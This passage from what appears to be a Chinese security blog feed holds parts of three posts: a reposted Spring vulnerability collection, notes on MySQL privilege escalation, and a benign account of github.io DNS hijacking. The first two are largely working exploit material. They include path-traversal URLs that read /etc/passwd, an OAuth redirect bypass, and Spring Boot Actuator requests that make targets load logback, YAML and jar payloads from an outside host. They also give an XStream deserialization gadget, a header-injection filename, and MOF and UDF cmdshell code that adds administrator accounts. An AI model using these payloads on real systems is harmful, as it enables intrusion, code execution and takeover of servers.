目录遍历</h2><blockquote><p>影响版本：Spring-Cloud-Config-Server &lt; 2.1.2, 2.0.4, 1.4.6</p></blockquote><p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd spring-cloud-config-server                                                                   ../mvnw spring-boot:run</span><br></pre></td></tr></table></figure><p>构建成功后访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd</span><br></pre></td></tr></table></figure><p>其中路径代表：<code>/{name}/{profile}/{label}/</code>，如下中所显示的json。</p><p><img src="/2020/08/12/Spring%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/13.png" alt></p><h2 id="0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#0x21-CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="0x21 CVE-2019-3778 Spring Security OAuth 开放重定向"></a>0x21 CVE-2019-3778 Spring Security OAuth 开放重定向</h2><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3 to 2.3.4</span><br><span class="line">Spring Security OAuth 2.2 to 2.2.3</span><br><span class="line">Spring Security OAuth 2.1 to 2.1.3</span><br><span class="line">Spring Security OAuth 2.0 to 2.0.16</span><br></pre></td></tr></table></figure><p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70" target="_blank" rel="noopener">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p><p>例如原始请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login</span><br></pre></td></tr></table></figure><p>只需要修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://%localhost:8086/login</span><br></pre></td></tr></table></figure><p>这样就不会产生原本的认证错误，而且直接跳转到地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Location: http://localhost:8086/login</span><br></pre></td></tr></table></figure><h2 id="0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#0x22-CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>0x22 CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h2><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p><p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p><ul><li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/dump-显示线程转储（包括堆栈跟踪）</span><br><span class="line">/trace-显示最后几条HTTP消息（其中可能包含会话标识符）</span><br><span class="line">/logfile-输出日志文件的内容</span><br><span class="line">/shutdown-关闭应用程序</span><br><span class="line">/mappings-显示所有MVC控制器映射</span><br><span class="line">/env-提供对配置环境的访问</span><br><span class="line">/restart-重新启动应用程序</span><br></pre></td></tr></table></figure><ul><li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list" target="_blank" rel="noopener">http://127.0.0.1:8090/jolokia/list</a></li></ul><p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/</span><br><span class="line"></span><br><span class="line">logback.xmllogback.xml：</span><br><span class="line">&lt;configuration&gt;  </span><br><span class="line">&lt;insertFromJNDI env-entry-name=&quot;ldap://artsploit.com:1389/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>reloadByURL功能从<a href="http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。" target="_blank" rel="noopener">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p><ul><li>通过/env来修改配置</li></ul><p>如果Spring Cloud Libraries在类路径中，则<strong>‘/ env’</strong>端点允许您修改Spring环境属性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length:65</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream</span><br></pre></td></tr></table></figure><p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p><p>其中xstream的内容类似如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                    &lt;command&gt;</span><br><span class="line">                      &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;</span><br><span class="line">                    &lt;/command&gt;</span><br><span class="line">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                  &lt;/next&gt;</span><br><span class="line">                &lt;/iter&gt;</span><br><span class="line">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                  &lt;method&gt;</span><br><span class="line">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                    &lt;parameter-types/&gt;</span><br><span class="line">                  &lt;/method&gt;</span><br><span class="line">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                &lt;/filter&gt;</span><br><span class="line">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="line">              &lt;/serviceIterator&gt;</span><br><span class="line">              &lt;lock/&gt;</span><br><span class="line">            &lt;/cipher&gt;</span><br><span class="line">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="line">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure><p>然后调用’/ refresh’端点。</p><ul><li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 59</span><br><span class="line">spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml</span><br></pre></td></tr></table></figure><p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://artsploit.com/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><ul><li>/env配置</li></ul><p>除了关于执行RCE的地方，还有一些设置也很有用。</p><p><strong>spring.datasource.tomcat.validationQuery = drop + table + users-</strong>允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p><p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。" target="_blank" rel="noopener">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p><p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p><h2 id="0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="0x23 CVE-2019-11269 Spring Security OAuth 开放重定向"></a>0x23 CVE-2019-11269 Spring Security OAuth 开放重定向</h2><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3至2.3.5</span><br><span class="line">Spring Security OAuth 2.2至2.2.4</span><br><span class="line">Spring Security OAuth 2.1至2.1.4</span><br><span class="line">Spring Security OAUth 2.0至2.0.17</span><br></pre></td></tr></table></figure><h2 id="0x24-CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#0x24-CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="0x24 CVE-2020-5398 Spring Framework RFD漏洞"></a>0x24 CVE-2020-5398 Spring Framework RFD漏洞</h2><blockquote><p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p></blockquote><p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd&quot; download&gt;</span><br><span class="line">Click me, Im a dolphin</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p><p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p><p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p><p>当受害者点击如上的地址时，会下载一个<attacker_id>.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</attacker_id></p><p>但是这个设置可以绕过，采用如下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename：secure_install.cmd&quot;;</span><br></pre></td></tr></table></figure><p>会在表头中闭合造成如下效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</span><br></pre></td></tr></table></figure><p>从而达到绕过限制来下载预先设定好的可执行文件等。</p><h2 id="0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h2><blockquote><p>影响版本：spring-cloud-config-server &lt; 2.2.2</p></blockquote><p>[<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md]" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md]</a>(<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring</a> Cloud/CVE-2020-5405 Spring Cloud Config 目录穿越/README.md)</p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">利用点1：</span><br><span class="line">curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftm</span><br><span class="line">p/aaa.xxx</span><br><span class="line"></span><br><span class="line">读取/User/xuanyonghao/tmp/aaa.xxx文件</span><br><span class="line">foo 对应 &#123;application&#125;</span><br><span class="line">profiles 对应 &#123;profiles&#125;</span><br><span class="line">%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 &#123;label&#125;</span><br><span class="line"></span><br><span class="line">todo 条件限制：</span><br><span class="line">todo 1. 文件必须有后缀，也就是.txt等等。</span><br><span class="line">todo 2. cloud: config: server: native: search-locations: file:///tmp/&#123;label&#125;，此处的目录需要</span><br><span class="line">有&#123;application&#125;或&#123;profiles&#125;或&#123;label&#125;，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀</span><br><span class="line"></span><br><span class="line">利用点2：</span><br><span class="line">org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)</span><br><span class="line">利用此处把label处的(_)替换为/</span><br><span class="line">curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx</span><br><span class="line"></span><br><span class="line">todo 条件限制：</span><br><span class="line">todo 1. 文件必须有后缀，也就是.txt等等。</span><br><span class="line">todo 2. 不像利用点1处，不需要配置&#123;application&#125;&#123;profiles&#125;&#123;label&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Spring漏洞集合&quot;&gt;&lt;a href=&quot;#Spring漏洞集合&quot; class=&quot;headerlink&quot; title=&quot;Spring漏洞集合&quot;&gt;&lt;/a&gt;Spring漏洞集合&lt;/h1&gt;&lt;p&gt;转载自&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://misakikata
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>数据库提权</title>
    <link href="http://bai-ren-1.github.io/2020/08/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2020/08/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</id>
    <published>2020-08-03T13:58:36.000Z</published>
    <updated>2020-08-03T15:35:59.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><p>怕被问，就记录一下。</p><h2 id="0x00-Mysql"><a href="#0x00-Mysql" class="headerlink" title="0x00 Mysql"></a>0x00 Mysql</h2><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在windows平台下，C:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间就会以system权限执行一次。所以，只要将我们要做的事通过代码存储到这个mof文件中，就可以实现权限提升。 </p><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了secure-file-priv</li></ul><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>准备好MOF代码，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">"\\\\.\\root\\subscription"</span>) </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>; </span><br><span class="line">Name  = <span class="string">"filtP2"</span>; </span><br><span class="line">    Query = <span class="string">"Select \ From __InstanceModificationEvent "</span> </span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span> </span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>; </span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>; </span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>; </span><br><span class="line">ScriptText = </span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add"</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">&#125;; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">instance of __FilterToConsumerBinding</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Consumer   = $Consumer; </span></span><br><span class="line"><span class="string">    Filter = $EventFilter; </span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure><p>将这个文件存储为nullevt.mof上传到任意一个你在受害机上可写的路径。然后在使用Mysql执行语句将这个MOF文件写入到C:/windows/system32/wbem/mof/中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><blockquote><p> 如果权限足够可以直接可以写到C:/windows/system32/wbem/mof/最好不过。 网上很多资料都提到win2003很容易利用，而更高版本的就很难成功了 。</p></blockquote><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限 </p><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><ul><li>Mysql版本<strong>大于5.1</strong>版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</li><li>Mysql版本<strong>小于5.1</strong>版本udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于C:\winnt\system32。</li><li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</li><li>可以将udf.dll写入到相应目录的权限。</li></ul><h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ul><li>将dll文件导入到相应目录，如果导入错误会产生can`t open shared library错误。</li><li>创建自定义函数 ，代码如下所示：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; // 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;// 删除函数</span><br></pre></td></tr></table></figure><blockquote><p> 注意这里的函数名应该与dll文件中的函数名一致。 </p></blockquote><ul><li></li></ul><h2 id="0x01-转载链接"><a href="#0x01-转载链接" class="headerlink" title="0x01 转载链接"></a>0x01 转载链接</h2><p><a href="https://blog.csdn.net/he_and/article/details/81434865" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/81434865</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据库提权&quot;&gt;&lt;a href=&quot;#数据库提权&quot; class=&quot;headerlink&quot; title=&quot;数据库提权&quot;&gt;&lt;/a&gt;数据库提权&lt;/h1&gt;&lt;p&gt;怕被问，就记录一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-Mysql&quot;&gt;&lt;a href=&quot;#0x00-Mysql&quot; c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Github.io挟持</title>
    <link href="http://bai-ren-1.github.io/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/"/>
    <id>http://bai-ren-1.github.io/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/</id>
    <published>2020-07-31T02:34:13.000Z</published>
    <updated>2020-11-18T08:08:00.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github-io挟持"><a href="#Github-io挟持" class="headerlink" title="Github.io挟持"></a>Github.io挟持</h1><p>像往常一样打开我的博客，发现github.io的都打不开了</p><h2 id="0x00-寻求解决"><a href="#0x00-寻求解决" class="headerlink" title="0x00 寻求解决"></a>0x00 寻求解决</h2><p>打开之后会提示证书有问题：</p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/1.png" alt></p><p>搜索一下发现github.io页也有别人发生一样的问题：<a href="https://www.v2ex.com/t/694065。依据里面的说法的话使用" target="_blank" rel="noopener">https://www.v2ex.com/t/694065。依据里面的说法的话使用</a> DNSCrypt  即可解决这个问题，且发生这个问题是出现了 dns 污染 。然后就去安装 DNSCrypt 啦，官网的地址如下： <a href="https://simplednscrypt.org/" target="_blank" rel="noopener">https://simplednscrypt.org/</a> </p><blockquote><p>这里的DNSCrypt其实是简易版的啦，亲测可以解决。</p></blockquote><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/2.png" alt></p><p>配置好选项后选择网卡，然后打开service按钮，即可加密DNS啦。使用之后访问博客：</p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/3.png" alt></p><p>然后要关闭服务的时候记得点一下remove service，不然可能访问不了国内的网站了：</p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/4.png" alt></p><h2 id="0x01-寻求原因"><a href="#0x01-寻求原因" class="headerlink" title="0x01 寻求原因"></a>0x01 寻求原因</h2><blockquote><p>下面如果没开启DNSCrypt会将DNS解析到本地上，明显是个错误的地址。</p></blockquote><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/5.png" alt></p><blockquote><p>开启了DNSCrypt后能解析到公网地址</p></blockquote><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/6.png" alt></p><p>开启前后返回不一样的解析结果，应该是DNS服务器被挟持了吧。结合帖子的内容应该是BGP挟持攻击了DNS服务器，然后通过DNS挟持或DNS污染来导致我们在访问博客时给我们返回错误的ip地址吧。以前好像也有挺多类似的手法：<a href="https://www.freebuf.com/articles/paper/180167.html，如下图所示：" target="_blank" rel="noopener">https://www.freebuf.com/articles/paper/180167.html，如下图所示：</a></p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/7.png" alt></p><h2 id="0x02-DNS挟持"><a href="#0x02-DNS挟持" class="headerlink" title="0x02 DNS挟持"></a>0x02 DNS挟持</h2><p><strong>DNS劫持</strong>一般指域名劫持。<strong>域名劫持</strong>是互联网攻击的一种方式，通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的IP地址从而实现用户无法访问目标网站的目的或者蓄意或恶意要求用户访问指定IP地址的目的。</p><blockquote><p>DNS污染是DNS挟持的一种攻击形式。</p></blockquote><h2 id="0x03-DNS污染"><a href="#0x03-DNS污染" class="headerlink" title="0x03 DNS污染"></a>0x03 